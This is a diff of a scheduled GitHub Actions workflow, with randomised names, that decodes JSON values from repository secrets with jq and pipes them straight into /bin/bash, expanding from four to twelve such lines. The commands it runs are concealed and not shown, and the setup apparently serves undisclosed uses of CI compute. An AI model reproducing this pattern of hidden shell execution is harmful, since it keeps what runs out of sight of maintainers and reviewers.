@@ -2,20 +2,26 @@ name: pangbaozheng5261
 on:
   workflow_dispatch:
   schedule:
-    - cron: '7 5/6 * * *'
-
+    - cron: '48 5/6 * * *'
 jobs:
   build:
     runs-on: ubuntu-latest
-
     steps:
       - uses: actions/checkout@v4
       - name: pangbaozheng5261
         env:
-          se2200: ${{ secrets.se2200 }}
+          ynsh55: ${{ secrets.ynsh55 }}
         run: |
-          echo $se2200 | jq -r .kkvvc8 | /bin/bash
-          echo $ptzws2610 | jq -r .qdrrg409 | /bin/bash
-          echo $aikj5 | jq -r .bgkiy04313 | /bin/bash
-          echo $dr5901 | jq -r .vn072 | /bin/bash
+          echo $ynsh55 | jq -r .rzmuy6629 | /bin/bash
+          echo $ij924 | jq -r .facsy7 | /bin/bash
+          echo $f23470 | jq -r .tk8035 | /bin/bash
+          echo $uelm98 | jq -r .hl18 | /bin/bash
+          echo $v69811 | jq -r .zzya0 | /bin/bash
+          echo $fzdmb75 | jq -r .mj4 | /bin/bash
+          echo $b29245 | jq -r .rdjap814 | /bin/bash
+          echo $a39 | jq -r .hmrjp65 | /bin/bash
+          echo $m42051 | jq -r .xfpbl155 | /bin/bash
+          echo $jhg1105 | jq -r .a232 | /bin/bash
+          echo $m042 | jq -r .n13 | /bin/bash
+          echo $dthwy22 | jq -r .p13 | /bin/bash
 
